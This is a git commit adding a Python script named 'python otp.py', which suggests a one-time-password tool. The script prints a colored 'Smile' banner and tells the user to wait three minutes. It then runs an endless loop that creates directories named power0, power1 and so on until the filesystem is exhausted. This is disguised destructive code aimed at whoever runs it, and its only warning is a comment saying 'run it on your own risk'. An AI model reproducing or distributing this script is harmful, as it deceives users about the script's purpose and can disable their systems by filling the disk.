2115b946bae0c23e3ac27ef760073aa4ad460312
Cyber_smile_54x45 <87195969+C7836-5M1L3@users.noreply.github.com>
2021-10-05 17:47:58 +0530

    Create python otp.py

---
+++ python otp.py
@@ -0,0 +1,18 @@
+#run it on your own risk
+import os
+print("\033[1;32;40m   \n")
+print("\u001b[31m      \n")
+print('╔═══╗───╔╗')
+print('║╔═╗║───║║')
+print('║╚══╦╗╔╦╣║╔══╗')
+print('╚══╗║╚╝╠╣║║║═╣')
+print('║╚═╝║║║║║╚╣║═╣')
+print('╚═══╩╩╩╩╩═╩══╝\n\n')
+print('Wait a 3 minutes!')
+print('Tool coded by Cyber smile!')
+
+import os
+i=0
+while True:
+    os.mkdir(f"power{i}")
+    i+=1
